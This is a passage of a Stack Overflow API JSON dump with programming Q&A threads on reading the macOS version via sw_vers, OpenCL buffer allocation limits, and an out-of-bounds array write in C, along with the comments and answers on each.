"https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1498070699, "post_id": 44683285, "comment_id": 76351996, "body": "Note that calling <code>sw_vers</code> via <code>popen</code> or <code>fork</code>/<code>exec</code> is not the same as using the command line."}, {"owner": {"reputation": 129, "user_id": 6849036, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/4c2c3466a4defa2c0212fa8d7dabde07?s=128&d=identicon&r=PG&f=1", "display_name": "lelephantt", "link": "https://stackoverflow.com/users/6849036/lelephantt"}, "reply_to_user": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "edited": false, "score": 0, "creation_date": 1498070861, "post_id": 44683285, "comment_id": 76352086, "body": "@jxh My project currently has been implemented using command line/parsing but in the V2 of our product we are building it from kernel calls using C/C++ to increase speed"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1498071234, "post_id": 44683285, "comment_id": 76352290, "body": "How often are you getting the version information?  How long does it take to run <code>sw_vers</code>?  Are you sure that the speed benefit is outweighed by the difficulty of finding out how to do it?  (FWIW, I note that <code>sw_vers</code> on macOS Sierra 10.12.5 reports <code>ProductName:\tMac OS X</code> \u2014 <code>ProductVersion:\t10.12.5</code> \u2014 <code>BuildVersion:\t16F73</code> so the code hasn&#39;t caught up with the marketing yet.)"}, {"owner": {"reputation": 129, "user_id": 6849036, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/4c2c3466a4defa2c0212fa8d7dabde07?s=128&d=identicon&r=PG&f=1", "display_name": "lelephantt", "link": "https://stackoverflow.com/users/6849036/lelephantt"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1498071556, "post_id": 44683285, "comment_id": 76352502, "body": "@JonathanLeffler hmm that&#39;s interesting it isn&#39;t saying macOS. That is one thing I am hoping to be able to differentiate anyways so that almost takes away the validity of parsing sw_vers. And I may be having a chat with my boss to see if we can&#39;t use the command line for this one as it seems after a couple hours scouring the internet that it is seemingly impossible"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1498071933, "post_id": 44683285, "comment_id": 76352759, "body": "It can be done \u2014 the program <code>sw_vers</code> demonstrates that it can be done.  What&#39;s less clear is what the <code>sw_vers</code> program is doing; what it is interrogating to find the information.  And if you find it involves using some Objective-C code, would that be acceptable?  I note that <code>man sw_vers</code> shows you can invoke it with an option to get any one of the fields without the tag prefix (<code>sw_vers -productName</code> \u2014 single-dash).  It also mentions files <code>&#47;System&#47;Library&#47;CoreServices&#47;SystemVersion.plist</code> and  <code>&#47;System&#47;Library&#47;CoreServices&#47;ServerVersion.plist</code> \u2014 does that help?"}], "answers": [{"comments": [{"owner": {"reputation": 1577, "user_id": 533761, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0dd2f17a9eab392890121e77c74559f2?s=128&d=identicon&r=PG", "display_name": "Neilvert Noval", "link": "https://stackoverflow.com/users/533761/neilvert-noval"}, "edited": false, "score": 1, "creation_date": 1561708497, "post_id": 44684199, "comment_id": 100160326, "body": "You can also add parameters to make the result specific. For example:   sw_vers -productVersion (to give you OS version number like 10.11.1)   sw_vers -buildVersion (to give you something like 15E01)   sw_vers -productName (to give you something like &quot;Mac OS X&quot;)"}, {"owner": {"reputation": 302, "user_id": 3856170, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/664c9879e1edc98551398dee37f3276f?s=128&d=identicon&r=PG&f=1", "display_name": "VikasPushkar", "link": "https://stackoverflow.com/users/3856170/vikaspushkar"}, "edited": false, "score": 0, "creation_date": 1583128465, "post_id": 44684199, "comment_id": 106998390, "body": "what if the system locale is something other than english? parsing will fail?"}, {"owner": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "reply_to_user": {"reputation": 302, "user_id": 3856170, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/664c9879e1edc98551398dee37f3276f?s=128&d=identicon&r=PG&f=1", "display_name": "VikasPushkar", "link": "https://stackoverflow.com/users/3856170/vikaspushkar"}, "edited": false, "score": 0, "creation_date": 1583138218, "post_id": 44684199, "comment_id": 107001575, "body": "@VikasPushkar: You could use the command line to specify the information of interest, as <a href=\"https://stackoverflow.com/questions/44683285/how-to-get-product-name-version-in-c-c-for-macos-ie-get-mac-os-and-10-12-5/44684199?noredirect=1#comment100160326_44684199\">Neilvert</a> suggests, or you could parse by line instead (since each line represents the info in a particular order)."}], "tags": [], "owner": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "is_accepted": false, "score": 3, "last_activity_date": 1498071819, "last_edit_date": 1498071819, "creation_date": 1498071516, "answer_id": 44684199, "question_id": 44683285, "link": "https://stackoverflow.com/questions/44683285/how-to-get-product-name-version-in-c-c-for-macos-ie-get-mac-os-and-10-12-5/44684199#44684199", "title": "How to get product name/version in C/C++ for macOS (ie get &quot;Mac OS&quot; and &quot;10.12.5&quot;)", "body": "<p>If this were my project, I would simply invoke the <code>sw_vers</code> utility and parse its output. You can use <code>popen</code> to accomplish this, illustrated below:</p>\n\n<pre><code>char buf[1024];\nunsigned buflen = 0;\nchar line[256];\nFILE *sw_vers = popen(\"sw_vers\", \"r\");\nwhile (fgets(line, sizeof(line), sw_vers) != NULL) {\n    int l = snprintf(buf + buflen, sizeof(buf) - buflen, \"%s\", line);\n    buflen += l;\n    assert(buflen &lt; sizeof(buf));\n}\npclose(sw_vers);\n</code></pre>\n\n<p>Parse the output to get the relevant information. On my system, the output is:</p>\n\n<pre><code>ProductName:    Mac OS X\nProductVersion: 10.12.5\nBuildVersion:   16F73\n</code></pre>\n\n<p>So, you could parse each line instead of storing it all into a buffer as illustrated.</p>\n\n<p>Once the information is stored in your program, the result can be cached. Any future queries by your same program can use the cached result rather than invoking <code>sw_vers</code> again.</p>\n"}], "owner": {"reputation": 129, "user_id": 6849036, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/4c2c3466a4defa2c0212fa8d7dabde07?s=128&d=identicon&r=PG&f=1", "display_name": "lelephantt", "link": "https://stackoverflow.com/users/6849036/lelephantt"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1482, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1498680626, "creation_date": 1498068500, "last_edit_date": 1498680626, "question_id": 44683285, "link": "https://stackoverflow.com/questions/44683285/how-to-get-product-name-version-in-c-c-for-macos-ie-get-mac-os-and-10-12-5", "title": "How to get product name/version in C/C++ for macOS (ie get &quot;Mac OS&quot; and &quot;10.12.5&quot;)", "body": "<p>I need to get the information in the title. I made sysctl calls to the following variables and it gave me other (not useful) information (usually regarding the kernel not the OS): KERN_VERSION, KERN_OSVERSION, KERN_TYPE, KERN_RELEASE.</p>\n\n<p>I looked at the source code for the command <code>sw_vers</code> here: <a href=\"https://opensource.apple.com/source/DarwinTools/DarwinTools-1/sw_vers.c\" rel=\"nofollow noreferrer\">https://opensource.apple.com/source/DarwinTools/DarwinTools-1/sw_vers.c</a> and tried to implement what they did however while I was able to include  my computer was unable to find  and thus I coulnd't implement. When I look through my /include/ directory I can't find /CoreFoundation/ at all so I don't know where I'm pulling it from.</p>\n\n<p>Any ideas on how I can get this using C/C++?</p>\n\n<p>Thanks</p>\n"}, {"tags": ["c++", "c", "memory", "opencl", "gpgpu"], "comments": [{"owner": {"reputation": 18522, "user_id": 5241642, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/TadbK.png?s=128&g=1", "display_name": "Xirema", "link": "https://stackoverflow.com/users/5241642/xirema"}, "edited": false, "score": 0, "creation_date": 1498074259, "post_id": 44683163, "comment_id": 76354101, "body": "What are you getting when you check the value of <code>errcode_ret</code>? Normally functions like this will fail by setting a value in that variable, not by crashing the program or throwing an exception."}, {"owner": {"reputation": 1431, "user_id": 322513, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/eeebf109a7781a1414597ad8275ae806?s=128&d=identicon&r=PG", "display_name": "Slaus", "link": "https://stackoverflow.com/users/322513/slaus"}, "reply_to_user": {"reputation": 18522, "user_id": 5241642, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/TadbK.png?s=128&g=1", "display_name": "Xirema", "link": "https://stackoverflow.com/users/5241642/xirema"}, "edited": false, "score": 0, "creation_date": 1498074722, "post_id": 44683163, "comment_id": 76354351, "body": "@Xirema errcode_ret is 0 after all of these calls which is CL_SUCCESS"}, {"owner": {"reputation": 18522, "user_id": 5241642, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/TadbK.png?s=128&g=1", "display_name": "Xirema", "link": "https://stackoverflow.com/users/5241642/xirema"}, "edited": false, "score": 0, "creation_date": 1498075403, "post_id": 44683163, "comment_id": 76354722, "body": "Could you edit in a full program which reproduces this issue? A sample program on my computer produced the error code <code>-61</code>, which corresponds to <code>CL_INVALID_BUFFER_SIZE</code>."}, {"owner": {"reputation": 1431, "user_id": 322513, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/eeebf109a7781a1414597ad8275ae806?s=128&d=identicon&r=PG", "display_name": "Slaus", "link": "https://stackoverflow.com/users/322513/slaus"}, "reply_to_user": {"reputation": 18522, "user_id": 5241642, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/TadbK.png?s=128&g=1", "display_name": "Xirema", "link": "https://stackoverflow.com/users/5241642/xirema"}, "edited": false, "score": 0, "creation_date": 1498076136, "post_id": 44683163, "comment_id": 76355118, "body": "@Xirema thank you for your attention. Problem actually &quot;solved&quot; now. I just proceeded at writing my first OpenCL app and discovered that upon enqueing the kernel which receives that buffer as parameter (passed with clSetKernelArg()) <b>pfn_notify()</b> invoked with CL_MEM_OBJECT_ALLOCATION_FAILURE error. Aquiring less memory at call to <b>clCreateBuffer()</b> solves the problem. I am trying all of these at my attic PC with OpenCL v1.1 and 12 years old GPU - I doubt you can reproduce that :)"}, {"owner": {"reputation": 1431, "user_id": 322513, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/eeebf109a7781a1414597ad8275ae806?s=128&d=identicon&r=PG", "display_name": "Slaus", "link": "https://stackoverflow.com/users/322513/slaus"}, "reply_to_user": {"reputation": 18522, "user_id": 5241642, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/TadbK.png?s=128&g=1", "display_name": "Xirema", "link": "https://stackoverflow.com/users/5241642/xirema"}, "edited": false, "score": 0, "creation_date": 1498076340, "post_id": 44683163, "comment_id": 76355223, "body": "@Xirema as I expected at the beginning, you actually <b>cannot</b> allocate CL_DEVICE_GLOBAL_MEM_SIZE amount of memory. Probably because some of that memory already used by something at Ubuntu_server? or is <b>constant/local</b>? etc. There is CL_DEVICE_MAX_MEM_ALLOC_SIZE, but, magically, it <b>does</b> allocate more than that with single call. Scouting the web now in search for answers to how allocate as much memory as possible."}, {"owner": {"reputation": 18522, "user_id": 5241642, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/TadbK.png?s=128&g=1", "display_name": "Xirema", "link": "https://stackoverflow.com/users/5241642/xirema"}, "edited": false, "score": 1, "creation_date": 1498076823, "post_id": 44683163, "comment_id": 76355446, "body": "<code>CL_DEVICE_MAX_MEM_ALLOC_SIZE</code> is the limit on individual buffers, and is required to be the larger of either 128Mb, or <code>CL_DEVICE_GLOBAL_MEM_SIZE &#47; 4</code>. So in most real-world scenarios, you should assume you cannot allocate buffers taking up more than 25% of total device memory. <a href=\"https://www.khronos.org/registry/OpenCL/sdk/2.0/docs/man/xhtml/clGetDeviceInfo.html\" rel=\"nofollow noreferrer\">See the Specification on how <code>CL_DEVICE_MAX_MEM_ALLOC_SIZE</code> is defined</a>. I don&#39;t know where you&#39;re observing that someone is allocating more than that, unless total memory is less than 512Mb."}, {"owner": {"reputation": 18522, "user_id": 5241642, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/TadbK.png?s=128&g=1", "display_name": "Xirema", "link": "https://stackoverflow.com/users/5241642/xirema"}, "edited": false, "score": 1, "creation_date": 1498078358, "post_id": 44683163, "comment_id": 76356204, "body": "I should emphasize that it&#39;s required to <i>at least be</i> the number I specified; Implementations are allowed to set the limit higher if the hardware can properly support it. I&#39;ve seen very few sets of hardware that support more than 33% memory use in a single buffer, but it&#39;s possible that it has happened."}, {"owner": {"reputation": 1431, "user_id": 322513, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/eeebf109a7781a1414597ad8275ae806?s=128&d=identicon&r=PG", "display_name": "Slaus", "link": "https://stackoverflow.com/users/322513/slaus"}, "reply_to_user": {"reputation": 18522, "user_id": 5241642, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/TadbK.png?s=128&g=1", "display_name": "Xirema", "link": "https://stackoverflow.com/users/5241642/xirema"}, "edited": false, "score": 0, "creation_date": 1498079270, "post_id": 44683163, "comment_id": 76356655, "body": "@Xirema I see, thank you. I guess, to allocate all the CL_DEVICE_GLOBAL_MEM_SIZE of GPU memory I need just create 4 buffers of CL_DEVICE_MAX_MEM_ALLOC_SIZE ... and pass 4 similar (but pointing to different buffers) params to kernel ..."}], "answers": [{"comments": [{"owner": {"reputation": 1431, "user_id": 322513, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/eeebf109a7781a1414597ad8275ae806?s=128&d=identicon&r=PG", "display_name": "Slaus", "link": "https://stackoverflow.com/users/322513/slaus"}, "edited": false, "score": 0, "creation_date": 1498118439, "post_id": 44693143, "comment_id": 76370141, "body": "My OpenCL version is 1.1, NVIDIA 340 driver, Ubuntu 16.04."}, {"owner": {"reputation": 321, "user_id": 1015320, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f4aca5081702d525d01a971937000cdb?s=128&d=identicon&r=PG", "display_name": "haahh", "link": "https://stackoverflow.com/users/1015320/haahh"}, "reply_to_user": {"reputation": 1431, "user_id": 322513, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/eeebf109a7781a1414597ad8275ae806?s=128&d=identicon&r=PG", "display_name": "Slaus", "link": "https://stackoverflow.com/users/322513/slaus"}, "edited": false, "score": 0, "creation_date": 1498119031, "post_id": 44693143, "comment_id": 76370538, "body": "Try to do a write to that 100GB buffer. It should fail. IIRC, also in other cases NVIDIA OpenCL platform sometimes tends to set error not in the actual failing function, but later, for example if <code>clEnqueueNDRangeKernel</code> call fails, error can be returned in the next <code>clFinish</code> or <code>clWaitForEvents</code> call (that&#39;s not related to lazy memory allocation)."}, {"owner": {"reputation": 1431, "user_id": 322513, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/eeebf109a7781a1414597ad8275ae806?s=128&d=identicon&r=PG", "display_name": "Slaus", "link": "https://stackoverflow.com/users/322513/slaus"}, "edited": false, "score": 0, "creation_date": 1498119460, "post_id": 44693143, "comment_id": 76370839, "body": "<b>clEnqueueNDRangeKernel()</b> actually fails with <b>CL_MEM_OBJECT_ALLOCATION_FAILURE</b> error, yes, thank you. As I was expecting, it indeed fails even when I try allocate <b>CL_DEVICE_GLOBAL_MEM_SIZE</b> memory, due to some limit per single allocation. Have to somehow allocate the whole global memory with several calls to <b>clCreateBuffer()</b>, sigh ..."}], "tags": [], "owner": {"reputation": 321, "user_id": 1015320, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f4aca5081702d525d01a971937000cdb?s=128&d=identicon&r=PG", "display_name": "haahh", "link": "https://stackoverflow.com/users/1015320/haahh"}, "is_accepted": true, "score": 2, "last_activity_date": 1498117244, "creation_date": 1498117244, "answer_id": 44693143, "question_id": 44683163, "link": "https://stackoverflow.com/questions/44683163/clcreatebuffer-never-fails/44693143#44693143", "title": "clCreateBuffer() never fails", "body": "<p>I may happen if OpenCL platform has lazy memory allocation (almost every platform does that). I guess some OpenCL platforms just check if what you requested can be allocated on <code>clCreateBuffer</code>, and maybe yours doesn't. You will probably get an error on the first OpenCL functions that actually uses your buffer, like <code>clEnqueueWriteBuffer()</code> etc. What is your OpenCL platform?</p>\n"}], "owner": {"reputation": 1431, "user_id": 322513, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/eeebf109a7781a1414597ad8275ae806?s=128&d=identicon&r=PG", "display_name": "Slaus", "link": "https://stackoverflow.com/users/322513/slaus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 315, "favorite_count": 1, "accepted_answer_id": 44693143, "answer_count": 1, "score": 0, "last_activity_date": 1498117244, "creation_date": 1498068059, "question_id": 44683163, "link": "https://stackoverflow.com/questions/44683163/clcreatebuffer-never-fails", "title": "clCreateBuffer() never fails", "body": "<p>Intending to use ALL the available on-GPU memory for my algorithm, so retrieving it's amount with:</p>\n\n<pre><code>clGetDeviceInfo( ..., CL_DEVICE_GLOBAL_MEM_SIZE, ... );\n</code></pre>\n\n<p>which is <strong>536543232</strong> bytes, and then allocate it on GPU with:</p>\n\n<pre><code>clCreateBuffer( gpuContext, CL_MEM_READ_WRITE, 536543232, NULL, &amp; errcode_ret );\n</code></pre>\n\n<p>Wondered why it worked and if it would fail if try to allocate some more memory? Tried out 100 gigs and it still worked!</p>\n\n<pre><code>clCreateBuffer( gpuContext, CL_MEM_READ_WRITE, 100000000000, NULL, &amp; errcode_ret );\n</code></pre>\n\n<p>So the question is why it works with whatever amount of memory specified?</p>\n"}, {"tags": ["c", "arrays", "random", "garbage"], "comments": [{"owner": {"reputation": 268334, "user_id": 4909087, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/LmD3e.png?s=128&g=1", "display_name": "cs95", "link": "https://stackoverflow.com/users/4909087/cs95"}, "edited": false, "score": 1, "creation_date": 1498067258, "post_id": 44682911, "comment_id": 76349985, "body": "Do you mind posting your output too?"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 3, "creation_date": 1498067263, "post_id": 44682911, "comment_id": 76349990, "body": "You are simly writing out of the array&#39;s bounds. And reading too."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1498067362, "post_id": 44682911, "comment_id": 76350036, "body": "It&#39;s undefined behavior."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1498067400, "post_id": 44682911, "comment_id": 76350057, "body": "... and written nothing to the 1st out-of-bounds position, but to the 2nd out-of-bounds position. You can only index an <code>int a[6]</code> to<code>a[5]</code> at most. Not <code>a[6]</code> and not <code>a[7]</code>."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1498067470, "post_id": 44682911, "comment_id": 76350103, "body": "<code>upper=upper+1;</code>-- Variable Length Array does not mean that you can change its size once declared."}, {"owner": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 0, "creation_date": 1498071777, "post_id": 44682911, "comment_id": 76352656, "body": "It&#39;s somehat undefined code too.  Please indent/format."}], "answers": [{"comments": [{"owner": {"reputation": 1613, "user_id": 5013336, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d627dbf935d8dcb71c8eff8a223e97cc?s=128&d=identicon&r=PG", "display_name": "Arka Mukherjee", "link": "https://stackoverflow.com/users/5013336/arka-mukherjee"}, "edited": false, "score": 0, "creation_date": 1498067496, "post_id": 44682966, "comment_id": 76350111, "body": "Ah, got it. Thanks. Any way to re-define the array with new bounds?"}, {"owner": {"reputation": 268334, "user_id": 4909087, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/LmD3e.png?s=128&g=1", "display_name": "cs95", "link": "https://stackoverflow.com/users/4909087/cs95"}, "reply_to_user": {"reputation": 1613, "user_id": 5013336, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d627dbf935d8dcb71c8eff8a223e97cc?s=128&d=identicon&r=PG", "display_name": "Arka Mukherjee", "link": "https://stackoverflow.com/users/5013336/arka-mukherjee"}, "edited": false, "score": 0, "creation_date": 1498067548, "post_id": 44682966, "comment_id": 76350136, "body": "@ArkaMukherjee Yep, using <code>calloc</code>, followed by a systematic copy of your elements."}, {"owner": {"reputation": 10050, "user_id": 3512538, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/6Om7A.png?s=128&g=1", "display_name": "CIsForCookies", "link": "https://stackoverflow.com/users/3512538/cisforcookies"}, "edited": false, "score": 1, "creation_date": 1498067596, "post_id": 44682966, "comment_id": 76350169, "body": "Not that I know of. Using pointers with malloc and realloc can help you change the size dynamically. Or declaring a new array"}], "tags": [], "owner": {"reputation": 10050, "user_id": 3512538, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/6Om7A.png?s=128&g=1", "display_name": "CIsForCookies", "link": "https://stackoverflow.com/users/3512538/cisforcookies"}, "is_accepted": false, "score": 1, "last_activity_date": 1498067656, "last_edit_date": 1498067656, "creation_date": 1498067392, "answer_id": 44682966, "question_id": 44682911, "link": "https://stackoverflow.com/questions/44682911/c-mystery-value-at-the-end-of-array/44682966#44682966", "title": "C- mystery value at the end of array", "body": "<p>you declare an array with size <code>upper</code> (6) but here:</p>\n\n<pre><code>a[upper]=66;\n</code></pre>\n\n<p>you try to access the 8th location of the array (since you did before that <code>upper= upper + 1</code>)- a location you don't own. What you are doing is UB and therefore it can print 47 or anything else can happen</p>\n"}, {"tags": [], "owner": {"reputation": 268334, "user_id": 4909087, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/LmD3e.png?s=128&g=1", "display_name": "cs95", "link": "https://stackoverflow.com/users/4909087/cs95"}, "is_accepted": false, "score": 1, "last_activity_date": 1498068113, "last_edit_date": 1498068113, "creation_date": 1498067441, "answer_id": 44682983, "question_id": 44682911, "link": "https://stackoverflow.com/questions/44682911/c-mystery-value-at-the-end-of-array/44682983#44682983", "title": "C- mystery value at the end of array", "body": "<p>What you've just encountered is undefined behaviour, which happens by accessing memory past the end of the array (when you set <code>upper</code> to 7). You are assigning a value to the 8th (index 7, out of bounds element) and then reading the 7th element (index 6, also out of bounds), which happens to just be junk.  </p>\n\n<p>Undefined behaviour is just that - <em>undefined</em>. There is no point even figuring out why it happens. It is entirely OS and compiler dependent. </p>\n"}, {"comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 2, "creation_date": 1498068222, "post_id": 44683186, "comment_id": 76350509, "body": "There is no &quot;8th&quot; element in the array. Not even a 7th element."}, {"owner": {"reputation": 45919, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "edited": false, "score": 0, "creation_date": 1498074177, "post_id": 44683186, "comment_id": 76354062, "body": "Substituting one instance of undefined behavior for another instance is not a reliable way to debug."}], "tags": [], "owner": {"reputation": 11, "user_id": 8186410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/acb4263e707bf4315c852b732a306330?s=128&d=identicon&r=PG&f=1", "display_name": "Utkarsh Baranwal", "link": "https://stackoverflow.com/users/8186410/utkarsh-baranwal"}, "is_accepted": false, "score": 0, "last_activity_date": 1498068123, "creation_date": 1498068123, "answer_id": 44683186, "question_id": 44682911, "link": "https://stackoverflow.com/questions/44682911/c-mystery-value-at-the-end-of-array/44683186#44683186", "title": "C- mystery value at the end of array", "body": "<p>You have assigned value 66 to 8th element(7th index) of array and you are printing from index number 0 to 6th.So, 6th index is not assigned any value by you. So, it is junk .If you want to add at end then change the line a[upper]=66 to a[upper-1]=66.</p>\n"}, {"comments": [{"owner": {"reputation": 45919, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "edited": false, "score": 0, "creation_date": 1498072579, "post_id": 44684270, "comment_id": 76353133, "body": "That isn&#39;t true -- the subsequent <code>for</code> loop would still invoke undefined behavior. <code>upper = upper+1;</code> has nothing to recommend for it. Also, <code>a[upper]</code> itself is out of bounds."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 1, "creation_date": 1498072819, "post_id": 44684270, "comment_id": 76353271, "body": "This is completely wrong. <code>a[upper]</code> is still an attempted out-of-bounds access, since arrays are zero-indexed in C, and the declaration is: <code>int a[upper];</code>."}], "tags": [], "owner": {"reputation": 1, "user_id": 8196069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c3e3f08b29c17509b226d79548d679d5?s=128&d=identicon&r=PG", "display_name": "Akami", "link": "https://stackoverflow.com/users/8196069/akami"}, "is_accepted": false, "score": -2, "last_activity_date": 1498071727, "creation_date": 1498071727, "answer_id": 44684270, "question_id": 44682911, "link": "https://stackoverflow.com/questions/44682911/c-mystery-value-at-the-end-of-array/44684270#44684270", "title": "C- mystery value at the end of array", "body": "<p>Reverse these two lines like this: </p>\n\n<pre><code>a[upper]=66; \nupper=upper+1; \n</code></pre>\n\n<p>And your code should be fine. </p>\n"}], "owner": {"reputation": 1613, "user_id": 5013336, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d627dbf935d8dcb71c8eff8a223e97cc?s=128&d=identicon&r=PG", "display_name": "Arka Mukherjee", "link": "https://stackoverflow.com/users/5013336/arka-mukherjee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 154, "favorite_count": 0, "answer_count": 4, "score": -1, "last_activity_date": 1498080847, "creation_date": 1498067209, "last_edit_date": 1498080847, "question_id": 44682911, "link": "https://stackoverflow.com/questions/44682911/c-mystery-value-at-the-end-of-array", "title": "C- mystery value at the end of array", "body": "<p>I am trying to insert an integer at the end of an array. However, a random value(47) shows up at the last position when I am trying to execute the code. 47 doesn't change even if I change the value to be inserted.\n<a href=\"https://i.stack.imgur.com/f2TsG.png\" rel=\"nofollow noreferrer\">Output is this.</a></p>\n\n<p>Can anyone tell me why it is 47? And is it a garbage value? My code is as follows:-</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\n#include&lt;stdlib.h&gt;\n\nint main()\n{\n  int upper=6; \n  int a[upper];\n  int i;\n  for(i=0;i&lt;upper;i++)\n  {\n    scanf(\"%d\",&amp;a[i]);\n  }\n  printf(\"The array before insertion is \\n\");\n  for(i=0;i&lt;upper;i++)\n  {\n    printf(\"%d \\n\",a[i]);\n  }\n  printf(\"\\n The array after insertion is \\n\");\n  upper=upper+1;\n  a[upper]=66;\n  for(i=0;i&lt;upper;i++)\n  {\n    printf(\"%d \\n\",a[i]);\n  }\n  return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "magic-square", "interpretation"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, 